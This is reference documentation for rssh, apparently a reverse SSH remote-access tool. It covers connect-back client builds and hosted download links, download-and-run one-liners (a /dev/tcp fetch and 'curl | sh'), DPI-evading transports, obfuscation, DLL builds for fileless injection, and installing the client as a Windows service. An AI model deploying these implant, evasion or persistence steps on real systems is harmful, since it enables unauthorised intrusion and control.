# Reference

This file contains misc details


## Fancy Features


### Automatic connect-back

The rssh client allows you to bake in a connect back address.
By default the `link` command will bake in the servers external address.

If you're (for some reason) manually building the binary, you can specify the environment variable `RSSH_HOMESERVER` to bake it into the client:

```sh
$ RSSH_HOMESERVER=your.rssh.server.internal:3232 make

# Will connect to your.rssh.server.internal:3232, even though no destination is specified
$ bin/client

# Behaviour is otherwise normal; will connect to the supplied host, e.g example.com:3232
$ bin/client -d example.com:3232
```

### Reverse shell download (client generation and in-built HTTP/Raw TCP server)

The RSSH server can build and host client binaries (`link` command). Which is the preferred method for building and serving clients.
For function to work the server must be placed in the project `bin/` folder, as it needs to find the client source.

By default the `docker` release has this all built properly, and is recommended for use

```sh
ssh your.rssh.server.internal -p 3232

catcher$ link -h

link [OPTIONS]
Link will compile a client and serve the resulting binary on a link which is returned.
This requires the web server component has been enabled.
        --fingerprint   Set RSSH server fingerprint will default to server public key
        --garble        Use garble to obfuscate the binary (requires garble to be installed)
        --goarch        Set the target build architecture (default runtime GOARCH)
        --goarm Set the go arm variable (not set by default)
        --goos  Set the target build operating system (default runtime GOOS)
        --http  Use http polling as the underlying transport
        --https Use https polling as the underlying transport
        --log-level     Set default output logging levels, [INFO,WARNING,ERROR,FATAL,DISABLED]
        --lzma  Use lzma compression for smaller binary at the cost of overhead at execution (requires upx flag to be set)
        --name  Set the link download url/filename (default random characters)
        --no-lib-c      Compile client without glibc
        --ntlm-proxy-creds      Set NTLM proxy credentials in format DOMAIN\\USER:PASS
        --owners        Set owners of client, if unset client is public all users. E.g --owners jsmith,ldavidson
        --proxy Set connect proxy address to bake it
        --raw-download  Download over raw TCP, outputs bash downloader rather than http
        --shared-object Generate shared object file
        --sni   When TLS is in use, set a custom SNI for the client to connect with
        --stdio Use stdin and stdout as transport, will disable logging, destination after stdio:// is ignored
        --tls   Use TLS as the underlying transport
        --upx   Use upx to compress the final binary (requires upx to be installed)
        --use-kerberos  Instruct client to try and use kerberos ticket when using a proxy
        --working-directory     Set download/working directory for automatic script (i.e doing curl https://<url>.sh)
        --ws    Use plain http websockets as the underlying transport
        --wss   Use TLS websockets as the underlying transport
        -C      Comment to add as the public key (acts as the name)
        -l      List currently active download links
        -o      Set owners of client, if unset client is public all users. E.g --owners jsmith,ldavidson
        -r      Remove download link
        -s      Set homeserver address, defaults to server --external_address if set, or server listen address if not

# Generate a client and serve it on a named link
catcher$ link --name test
http://your.rssh.server.internal:3232/test
```

Then you can download it as follows:

```sh
wget http://your.rssh.server.internal:3232/test
chmod +x test
./test
```

Or you can use raw tcp to download the client binary:
```sh
bash -c "exec 3<>/dev/tcp/your.rssh.server.internal/3232; echo RAWtest>&3; cat <&3" > test
```
The format for this is just `RAW` followed by the filename, i.e in this case `test`, rssh can autogenerate this for you with `--raw-download`.

The RSSH server also supports `.sh`, `.py` and `.ps1` URL path endings which will generate a script you can pipe into an intepreter:
```sh
curl http://your.rssh.server.internal:3232/test.sh | sh
```

### Alternate Transports (HTTP/Websockets/TLS)
The reverse SSH server and client both support multiple transports for when deep packet inspection blocks SSH outbound from a host or network. 
You can either specify the connect back scheme manually by specifying it as a url in the client. 

E.g
```sh
./client -d ws://your.rssh.server:3232
```

Or by baking it in with the `link` command. 
```sh
ssh your.rssh.server -p 3232 link --ws --name test
```


### Windows DLL Generation

You can compile the client as a DLL to be loaded with something like [Invoke-ReflectivePEInjection](https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1). Which is useful when you want to do fileless injection of the rssh client.

This will need a cross compiler if you are doing this on linux, use `mingw-w64-gcc`, this is included in the docker release.

```bash
# Using the link command
catcher$ link --goos windows --shared-object --name windows_dll
http://your.rssh.server.internal:3232/windows_dll

# If building manually
CC=x86_64-w64-mingw32-gcc GOOS=windows RSSH_HOMESERVER=192.168.1.1:2343 make client_dll
```

### SSH Subsystems

The SSH protocol supports calling subsystems with the `-s` flag. In RSSH this is repurposed to provide special commands for platforms, and `sftp` support.


#### All

`list`  Lists avaiable subsystem

`sftp`: Runs the sftp handler to transfer files

#### Linux

`setgid`:   Attempt to change group

`setuid`:   Attempt to change user

#### Windows
`service`: Installs or removes the rssh binary as a windows service, requires administrative rights


e.g

```sh
# Install the rssh binary as a service (windows only)
ssh -J your.rssh.server.internal:3232 test-pc.user.test-pc -s service --install
```

### Windows Service Integration

The client RSSH binary supports being run as windows service. 

### Full Windows Shell Support

This project uses `conpty` on current versions of windows, and `winpty` library on older versions. This should mean that the RSSH client on almost all versions of windows will net you a nice shell.

It is still quite challenging to capture all output for some Powershell applets. If you start a command that doesnt seem to end, it may be that it is asking for input in a way that you cannot see. 

### Webhooks

The RSSH server can send out raw HTTP requests set using the `webhook` command from the terminal interface.

First enable a webhook:
```bash
$ ssh your.rssh.server.internal -p 3232
catcher$ webhook --on http://localhost:8080/
```

Then disconnect, or connect a client, this will when issue a `POST` request with the following format.


```bash
$ nc -l -p 8080
POST /rssh_webhook HTTP/1.1
Host: localhost:8080
User-Agent: Go-http-client/1.1
Content-Length: 165
Content-Type: application/json
Accept-Encoding: gzip

{"Status":"connected","ID":"ae92b6535a30566cbae122ebb2a5e754dd58f0ca","IP":"[::1]:52608","HostName":"user.computer","Timestamp":"2022-06-12T12:23:40.626775318+12:00"}%
```


As an additional note, please use the `/slack` endpoint if connecting this to discord.

### Tun (VPN)

RSSH and SSH support creating tuntap interfaces that allow you to route traffic and create pseudo-VPN. It does take a bit more setup than just a local or remote forward (`-L`, `-R`), but in this mode you can send `UDP` and `ICMP` traffic.

#### Important Notice

If you connect to a malicious RSSH client, it will be able to connect back to your tunnel device. As such it is important not to have forwarding enabled, and to either have firewall rules to stop any connections to the local machine, or run this from within a container/netns.

Install a client on a remote machine, this will not work if you have your RSSH client on the same host as your tun device.
```sh
sudo ssh -J your.rssh.server.internal:3232 user.wombo -w 0:any

sudo ip link set dev tun0 up
sudo ip route add 0.0.0.0/0 dev tun0
```

This has some limitations, it is only able to send `UDP`/`TCP`/`ICMP`, and not arbitrary layer 3 protocols. `ICMP` is best effort and may make use of the remote hosts `ping` tool, as `ICMP` sockets are privileged on most machines. This also does not support `tap` devices, e.g layer 2 traffic, as this would require administrative access.




